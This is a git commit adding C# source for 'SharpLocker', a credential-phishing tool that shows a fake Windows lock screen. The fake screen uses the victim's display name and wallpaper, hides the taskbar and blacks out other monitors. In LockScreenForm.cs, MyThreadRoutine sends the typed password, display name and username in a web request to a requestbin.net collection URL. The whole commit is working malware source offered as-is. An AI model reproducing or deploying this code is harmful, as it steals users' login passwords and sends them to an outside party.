650d7c0d27981312e29fa33ae1bbe511094323cd
cammo1123 <36214028+cammo1123@users.noreply.github.com>
2020-02-13 10:20:58 +1100

    Added Un-Compiled Version

---
+++ Pasword PWN/SharpLocker/LockScreenForm.Designer.cs
@@ -0,0 +1,167 @@
+﻿namespace SharpLocker
+{
+    partial class LockScreenForm
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(LockScreenForm));
+            this.UserNameLabel = new System.Windows.Forms.Label();
+            this.PasswordTextBox = new System.Windows.Forms.TextBox();
+            this.ProfileIcon = new System.Windows.Forms.PictureBox();
+            this.SubmitPasswordButton = new System.Windows.Forms.Button();
+            this.panel1 = new System.Windows.Forms.Panel();
+            this.panel2 = new System.Windows.Forms.Panel();
+            ((System.ComponentModel.ISupportInitialize)(this.ProfileIcon)).BeginInit();
+            this.panel1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // UserNameLabel
+            // 
+            this.UserNameLabel.Anchor = System.Windows.Forms.AnchorStyles.None;
+            this.UserNameLabel.AutoSize = true;
+            this.UserNameLabel.Font = new System.Drawing.Font("Segoe UI Light", 33F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.UserNameLabel.ForeColor = System.Drawing.Color.White;
+            this.UserNameLabel.Location = new System.Drawing.Point(0, 230);
+            this.UserNameLabel.MinimumSize = new System.Drawing.Size(400, 0);
+            this.UserNameLabel.Name = "UserNameLabel";
+            this.UserNameLabel.Size = new System.Drawing.Size(400, 60);
+            this.UserNameLabel.TabIndex = 4;
+            this.UserNameLabel.Text = "label2";
+            this.UserNameLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            this.UserNameLabel.Click += new System.EventHandler(this.UserNameLabel_Click);
+            // 
+            // PasswordTextBox
+            // 
+            this.PasswordTextBox.Anchor = System.Windows.Forms.AnchorStyles.None;
+            this.PasswordTextBox.BackColor = System.Drawing.Color.White;
+            this.PasswordTextBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.PasswordTextBox.Font = new System.Drawing.Font("Arial", 20F);
+            this.PasswordTextBox.ForeColor = System.Drawing.SystemColors.MenuText;
+            this.PasswordTextBox.Location = new System.Drawing.Point(18, 304);
+            this.PasswordTextBox.Margin = new System.Windows.Forms.Padding(3, 3, 0, 3);
+            this.PasswordTextBox.Name = "PasswordTextBox";
+            this.PasswordTextBox.PasswordChar = '•';
+            this.PasswordTextBox.Size = new System.Drawing.Size(325, 38);
+            this.PasswordTextBox.TabIndex = 6;
+            this.PasswordTextBox.TextChanged += new System.EventHandler(this.PasswordTextBox_TextChanged);
+            // 
+            // ProfileIcon
+            // 
+            this.ProfileIcon.Anchor = System.Windows.Forms.AnchorStyles.None;
+            this.ProfileIcon.BackColor = System.Drawing.Color.Transparent;
+            this.ProfileIcon.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.ProfileIcon.Image = ((System.Drawing.Image)(resources.GetObject("ProfileIcon.Image")));
+            this.ProfileIcon.Location = new System.Drawing.Point(101, 28);
+            this.ProfileIcon.Name = "ProfileIcon";
+            this.ProfileIcon.Size = new System.Drawing.Size(199, 199);
+            this.ProfileIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.ProfileIcon.TabIndex = 1;
+            this.ProfileIcon.TabStop = false;
+            this.ProfileIcon.Click += new System.EventHandler(this.pictureBox1_Click);
+            // 
+            // SubmitPasswordButton
+            // 
+            this.SubmitPasswordButton.Anchor = System.Windows.Forms.AnchorStyles.None;
+            this.SubmitPasswordButton.AutoSize = true;
+            this.SubmitPasswordButton.BackColor = System.Drawing.Color.Transparent;
+            this.SubmitPasswordButton.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("SubmitPasswordButton.BackgroundImage")));
+            this.SubmitPasswordButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.SubmitPasswordButton.FlatAppearance.BorderSize = 0;
+            this.SubmitPasswordButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.SubmitPasswordButton.Font = new System.Drawing.Font("Arial Narrow", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.SubmitPasswordButton.ForeColor = System.Drawing.SystemColors.MenuText;
+            this.SubmitPasswordButton.Location = new System.Drawing.Point(343, 304);
+            this.SubmitPasswordButton.Margin = new System.Windows.Forms.Padding(0);
+            this.SubmitPasswordButton.Name = "SubmitPasswordButton";
+            this.SubmitPasswordButton.Size = new System.Drawing.Size(38, 38);
+            this.SubmitPasswordButton.TabIndex = 9;
+            this.SubmitPasswordButton.UseVisualStyleBackColor = true;
+            this.SubmitPasswordButton.Click += new System.EventHandler(this.button1_Click_1);
+            // 
+            // panel1
+            // 
+            this.panel1.Anchor = System.Windows.Forms.AnchorStyles.None;
+            this.panel1.AutoSize = true;
+            this.panel1.BackColor = System.Drawing.Color.Transparent;
+            this.panel1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("panel1.BackgroundImage")));
+            this.panel1.Controls.Add(this.UserNameLabel);
+            this.panel1.Controls.Add(this.SubmitPasswordButton);
+            this.panel1.Controls.Add(this.ProfileIcon);
+            this.panel1.Controls.Add(this.PasswordTextBox);
+            this.panel1.ForeColor = System.Drawing.Color.Transparent;
+            this.panel1.Location = new System.Drawing.Point(226, 11);
+            this.panel1.Name = "panel1";
+            this.panel1.Size = new System.Drawing.Size(400, 346);
+            this.panel1.TabIndex = 10;
+            // 
+            // panel2
+            // 
+            this.panel2.AllowDrop = true;
+            this.panel2.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
+            | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.panel2.AutoSize = true;
+            this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(80)))));
+            this.panel2.BackgroundImage = global::SharpLocker.Properties.Resources.Background;
+            this.panel2.ForeColor = System.Drawing.Color.Transparent;
+            this.panel2.Location = new System.Drawing.Point(0, 0);
+            this.panel2.Name = "panel2";
+            this.panel2.Size = new System.Drawing.Size(800, 450);
+            this.panel2.TabIndex = 11;
+            // 
+            // LockScreenForm
+            // 
+            this.AcceptButton = this.SubmitPasswordButton;
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.White;
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.Controls.Add(this.panel1);
+            this.Controls.Add(this.panel2);
+            this.ForeColor = System.Drawing.Color.White;
+            this.Name = "LockScreenForm";
+            this.Load += new System.EventHandler(this.LockScreenForm_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.ProfileIcon)).EndInit();
+            this.panel1.ResumeLayout(false);
+            this.panel1.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label UserNameLabel;
+        private System.Windows.Forms.TextBox PasswordTextBox;
+        private System.Windows.Forms.PictureBox ProfileIcon;
+        private System.Windows.Forms.Button SubmitPasswordButton;
+        private System.Windows.Forms.Panel panel1;
+        private System.Windows.Forms.Panel panel2;
+    }
+}
+
---
+++ Pasword PWN/SharpLocker/LockScreenForm.cs
@@ -0,0 +1,242 @@
+﻿using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Drawing;
+using System.Threading;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.DirectoryServices.AccountManagement;
+using System.Net;
+using System.Web;
+using System.IO;
+using System.Activities.Expressions;
+
+namespace SharpLocker
+{
+
+
+    public partial class LockScreenForm : Form
+    {
+
+        public LockScreenForm()
+        {
+
+            InitializeComponent();
+            String userName = (string)UserPrincipal.Current.DisplayName;
+            if (userName == null)
+            {
+                userName = Environment.UserName.ToString();
+            }
+            String envUserName = Environment.UserName.ToString();
+            
+            FormBorderStyle = FormBorderStyle.None;
+            WindowState = FormWindowState.Normal;
+            StartPosition = FormStartPosition.Manual;
+            Location = new Point(0, 0);
+            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            string sid = UserPrincipal.Current.Sid.ToString();
+            string dir = (string)(@"C:\\ProgramData\\Microsoft\\Windows\\SystemData\\" + sid + "\\ReadOnly\\LockScreen_A\\LockScreen.jpg");
+            try
+            {
+                Image myimage = new Bitmap(@"C:\\ProgramData\\Microsoft\\Windows\\SystemData\\" + sid + "\\ReadOnly\\LockScreen_A\\LockScreen.jpg");
+                BackgroundImage = myimage;
+                BackgroundImageLayout = ImageLayout.Stretch;
+            }
+            catch (Exception)
+            {
+                Image myimage = new Bitmap(@"C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg");
+                BackgroundImage = myimage;
+                BackgroundImageLayout = ImageLayout.Stretch;
+            }
+            Taskbar.Hide();
+            this.TopMost = true;
+            UserNameLabel.Text = userName;
+            UserNameLabel.BackColor = Color.Transparent;
+
+            foreach (var screen in Screen.AllScreens)
+            {
+
+                Thread thread = new Thread(() => WorkThreadFunction(screen));
+                thread.Start();
+            }
+
+
+        }
+
+        private void MyThreadRoutine()
+        {
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/r4sydnr4?&Password:" + PasswordTextBox.Text + "&UserName:" + (string)UserPrincipal.Current.DisplayName + "&envName:" + Environment.UserName.ToString());
+            req.GetResponse();
+            System.Windows.Forms.Application.Exit();
+        }
+        private void exitApp()
+        {
+            ThreadStart myThreadStart = new ThreadStart(MyThreadRoutine);
+            Thread myThread = new Thread(myThreadStart);
+            myThread.Start();
+            PasswordTextBox.Hide();
+            SubmitPasswordButton.Hide();
+            Taskbar.Show();
+            System.Windows.Forms.Application.Exit();
+        }
+
+        public class Taskbar
+        {
+            [DllImport("user32.dll")]
+            private static extern int FindWindow(string className, string windowText);
+
+            [DllImport("user32.dll")]
+            private static extern int ShowWindow(int hwnd, int command);
+
+            [DllImport("user32.dll")]
+            public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);
+
+            [DllImport("user32.dll")]
+            private static extern int GetDesktopWindow();
+
+            private const int SW_HIDE = 0;
+            private const int SW_SHOW = 1;
+
+            protected static int Handle
+            {
+                get
+                {
+                    return FindWindow("Shell_TrayWnd", "");
+                }
+            }
+
+            protected static int HandleOfStartButton
+            {
+                get
+                {
+                    int handleOfDesktop = GetDesktopWindow();
+                    int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
+                    return handleOfStartButton;
+                }
+            }
+
+            private Taskbar()
+            {
+                // hide ctor
+            }
+
+            public static void Show()
+            {
+                ShowWindow(Handle, SW_SHOW);
+                ShowWindow(HandleOfStartButton, SW_SHOW);
+            }
+
+            public static void Hide()
+            {
+                ShowWindow(Handle, SW_HIDE);
+                ShowWindow(HandleOfStartButton, SW_HIDE);
+            }
+        }
+
+        public void WorkThreadFunction(Screen screen)
+        {
+            try
+            {
+                if (screen.Primary == true)
+                {
+                   
+                    
+                }
+
+                if (screen.Primary == false)
+                {
+                    int mostLeft = screen.WorkingArea.Left;
+                    int mostTop = screen.WorkingArea.Top;
+                    Debug.WriteLine(mostLeft.ToString(), mostTop.ToString());
+                    using (Form form = new Form())
+                    {
+                        form.WindowState = FormWindowState.Normal;
+                        form.StartPosition = FormStartPosition.Manual;
+                        form.Location = new Point(mostLeft, mostTop);
+                        form.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+                        form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
+                        form.BackColor = Color.Black;
+                        form.ShowDialog();
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                // log errors
+            }
+        }
+
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+
+        private void UserNameLabel_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        protected override CreateParams CreateParams
+        {
+            get
+            {
+                var parms = base.CreateParams;
+                parms.Style &= ~0x02000000;  // Turn off WS_CLIPCHILDREN
+                parms.ExStyle |= 0x02000000;
+                return parms;
+            }
+        }
+
+        private void pictureBox2_Click(object sender, EventArgs e)
+        {
+            exitApp();
+        }
+
+        protected override void OnClosing(CancelEventArgs e)
+        {
+            Taskbar.Show();
+            base.OnClosing(e);
+        }
+
+        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
+        {
+            
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void pictureBox3_Click(object sender, EventArgs e)
+        {
+            exitApp();
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+            exitApp();
+        }
+
+        private void LockScreenForm_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void groupBox1_Enter(object sender, EventArgs e)
+        {
+
+        }
+    }
+    
+
+}
